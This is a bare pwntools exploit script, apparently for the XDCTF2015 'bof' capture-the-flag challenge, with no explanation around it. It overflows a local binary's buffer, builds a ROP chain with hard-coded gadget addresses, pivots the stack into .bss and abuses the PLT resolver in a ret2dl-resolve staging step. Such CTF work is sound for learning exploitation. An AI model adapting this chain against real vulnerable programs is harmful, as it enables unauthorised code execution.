#!/usr/bin/python

from pwn import *
elf = ELF('bof')

offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619        # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458      # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040       # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload  = 'A' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
r.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380          # objdump -d -j .plt bof
index_offset = 0x20

payload2  = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)

r.interactive()
